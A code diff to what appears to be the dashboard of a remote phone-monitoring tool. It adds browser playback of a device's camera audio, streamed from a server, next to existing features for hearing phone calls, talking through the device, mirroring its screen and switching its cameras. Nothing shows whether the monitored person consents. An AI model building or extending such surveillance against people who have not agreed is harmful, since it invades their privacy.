@@ -114,6 +114,16 @@ document.addEventListener('DOMContentLoaded', () => {
   toggleCameraBtn.addEventListener('click', toggleCamera);
   frontCamBtn.addEventListener('click', () => setCameraSource('front'));
   backCamBtn.addEventListener('click', () => setCameraSource('back'));
+  const cameraAudioBtn = document.getElementById('camera-audio-btn');
+  if (cameraAudioBtn) {
+    cameraAudioBtn.addEventListener('click', () => {
+      if (isCameraAudioPlaying) {
+        stopCameraAudio();
+      } else {
+        startCameraAudio();
+      }
+    });
+  }
   tabCameraBtn.addEventListener('click', () => switchMediaTab('camera'));
   tabScreenBtn.addEventListener('click', () => switchMediaTab('screen'));
   toggleScreenBtn.addEventListener('click', toggleScreenShare);
@@ -532,6 +542,10 @@ function updateUI(data) {
     cameraVideoFrame.style.display = 'none';
     cameraLoader.style.display = 'none';
     cameraVideoFrame.src = '';
+    
+    if (isCameraAudioPlaying) {
+      stopCameraAudio();
+    }
   }
 
   // Update Screen Mirror Panel Stream
@@ -1054,6 +1068,10 @@ let talkStream = null;
 let talkProcessor = null;
 let isTalking = false;
 
+let cameraAudioContext = null;
+let cameraAudioReader = null;
+let isCameraAudioPlaying = false;
+
 // 1. Listen Live (Hear Phone Call)
 const startHearBtn = document.getElementById('start-hear-btn');
 const hearVisualizer = document.getElementById('hear-visualizer');
@@ -1229,6 +1247,86 @@ function stopTalking() {
   }
   if (talkIndicator) {
     talkIndicator.style.display = 'none';
+  }
+}
+
+// 3. Camera Feed Audio Playback (Listen to Camera Audio)
+async function startCameraAudio() {
+  try {
+    const cameraAudioBtn = document.getElementById('camera-audio-btn');
+    if (!cameraAudioBtn) return;
+
+    cameraAudioBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin" style="margin-right: 8px;"></i> Connecting...`;
+
+    cameraAudioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
+    let nextStartTime = 0;
+
+    const response = await fetch(`${config.serverUrl}/api/audio/stream?email=${encodeURIComponent(config.adminEmail)}&token=${encodeURIComponent(config.adminToken)}`);
+    if (!response.ok) {
+      throw new Error(`HTTP Error ${response.status}`);
+    }
+
+    isCameraAudioPlaying = true;
+    cameraAudioBtn.innerHTML = `<i class="fa-solid fa-volume-high" style="margin-right: 8px;"></i> Audio: Listening`;
+    cameraAudioBtn.style.borderColor = '#10B981';
+    cameraAudioBtn.style.color = '#10B981';
+
+    const reader = response.body.getReader();
+    cameraAudioReader = reader;
+
+    while (isCameraAudioPlaying) {
+      const { done, value } = await reader.read();
+      if (done) break;
+
+      if (value && value.byteLength >= 2) {
+        const view = new DataView(value.buffer, value.byteOffset, value.byteLength);
+        const samplesCount = Math.floor(value.byteLength / 2);
+        const float32Array = new Float32Array(samplesCount);
+        for (let i = 0; i < samplesCount; i++) {
+          float32Array[i] = view.getInt16(i * 2, true) / 32768.0;
+        }
+
+        if (cameraAudioContext.state === 'suspended') {
+          await cameraAudioContext.resume();
+        }
+
+        const audioBuffer = cameraAudioContext.createBuffer(1, float32Array.length, 16000);
+        audioBuffer.copyToChannel(float32Array, 0);
+
+        const source = cameraAudioContext.createBufferSource();
+        source.buffer = audioBuffer;
+        source.connect(cameraAudioContext.destination);
+
+        const currentTime = cameraAudioContext.currentTime;
+        if (nextStartTime < currentTime) {
+          nextStartTime = currentTime + 0.05;
+        }
+        source.start(nextStartTime);
+        nextStartTime += audioBuffer.duration;
+      }
+    }
+    stopCameraAudio();
+  } catch (err) {
+    console.error('Failed to hear camera audio:', err);
+    stopCameraAudio();
+  }
+}
+
+function stopCameraAudio() {
+  isCameraAudioPlaying = false;
+  if (cameraAudioReader) {
+    try { cameraAudioReader.cancel(); } catch (e) {}
+    cameraAudioReader = null;
+  }
+  if (cameraAudioContext) {
+    try { cameraAudioContext.close(); } catch (e) {}
+    cameraAudioContext = null;
+  }
+  const cameraAudioBtn = document.getElementById('camera-audio-btn');
+  if (cameraAudioBtn) {
+    cameraAudioBtn.innerHTML = `<i class="fa-solid fa-volume-xmark" style="margin-right: 8px;"></i> Audio: Muted`;
+    cameraAudioBtn.style.borderColor = '#EF4444';
+    cameraAudioBtn.style.color = '#EF4444';
   }
 }
 
